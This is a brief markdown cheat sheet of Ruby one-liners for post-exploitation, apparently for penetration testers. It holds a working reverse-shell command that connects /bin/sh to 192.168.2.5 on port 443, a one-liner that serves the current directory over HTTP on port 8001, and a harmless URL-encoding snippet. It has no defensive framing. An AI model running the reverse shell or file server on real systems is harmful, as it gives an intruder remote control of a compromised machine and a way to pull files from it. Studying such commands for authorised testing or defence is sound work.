# Ruby Command and Scripts for Post Exploitation

One liners
-----------

**Start a web server that serves the local files from current directory on port 8001**
```ruby 
ruby -run -e httpd -- -p 8001 .```

**Reverse /bin/sh shell on port 443 from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**
```ruby 
ruby -rsocket -e'f=TCPSocket.open("192.168.2.5",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

***URL Encode***
```ruby
ruby -e 'require "open-uri"; result = URI.escape(YOUR STRING HERE, Regexp.new("[^#{URI::PATTERN::UNRESERVED}]"))'```


